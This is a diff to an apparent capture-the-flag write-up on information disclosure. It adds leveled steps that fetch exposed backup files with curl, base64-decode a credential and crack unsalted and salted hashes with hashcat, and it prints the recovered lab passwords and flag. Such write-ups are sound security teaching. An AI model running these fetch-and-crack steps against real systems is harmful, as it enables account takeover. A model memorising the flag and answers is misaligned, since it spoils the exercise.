@@ -148,6 +148,25 @@ not executed by PHP it is served as plaintext source, leaking `ADMIN_PASS = S3nt
 `API_SIGNING_KEY = sk_live_9f2c1a77d4b0e5f6a1b2c3d4`. `robots.txt` advertised the path.
 Flag: `FLAG{c0nfig_backup_left_in_webroot}`.
 
+**Leveled — the same credential, in a harder form each level** (discover the paths via the chain
+`robots.txt` → `/.well-known/security.txt` → `/private/deployment-notes.txt`, which breadcrumbs the rest,
+or fuzz `/private/` with feroxbuster/ffuf):
+```
+# easy   — plaintext in the config backup:
+curl -s "$U/config.php.bak"                                        # ADMIN_PASS = S3ntinel!Admin
+# medium — base64-encoded in a legacy file:
+curl -s "$U/private/legacy_creds.b64" | grep -v '^#' | base64 -d   # admin:Sup3rStaging!99
+# hard   — unsalted hash in a user dump -> identify + crack:
+curl -s "$U/private/backup_users.txt"                              # admin:<sha1>
+hashid '<sha1>'   # SHA-1 ; then:  hashcat -m 100 hash.txt rockyou.txt   -> chocolate
+# expert — salted hash (hash:salt) in an old backup -> crack with the matching mode:
+curl -s "$U/private/old_admin.bak"                                 # admin:<md5>:<salt>
+hashcat -m 10 hash.txt rockyou.txt   # feed 'hash:salt' (md5(pass.salt))  -> liverpool
+```
+**Lesson:** "info disclosure" is rarely one plaintext file — leaked backups expose secrets at every
+protection level; plaintext → base64 → unsalted → salted only changes *how much work* recovery takes,
+not *whether* it's possible once a file that shouldn't be reachable is served at all.
+
 **Discovery (how the path was found):** the app returns a page for almost every path, so plain
 status-based busting is noisy and `robots.txt`/`uploads` get hidden (they 404). `feroxbuster` with
 all status codes + link extraction surfaces them:
